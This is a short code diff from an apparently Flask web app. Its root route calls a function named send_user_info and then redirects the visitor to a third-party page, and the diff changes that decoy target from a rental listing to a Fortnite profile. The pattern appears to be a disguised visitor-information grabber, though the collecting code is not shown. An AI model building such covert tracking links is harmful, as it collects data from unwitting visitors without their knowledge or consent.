@@ -28,7 +28,7 @@ def send_user_info():
 @app.route('/', methods=['GET'])
 def crib_form():
     send_user_info()
-    return redirect("https://rieltor.ua/harkov/flats-rent/view/9246735/")
+    return redirect("https://fortnitetracker.com/profile/all/SFD.%20SuperSimBa/")
 
 
 if __name__ == '__main__':
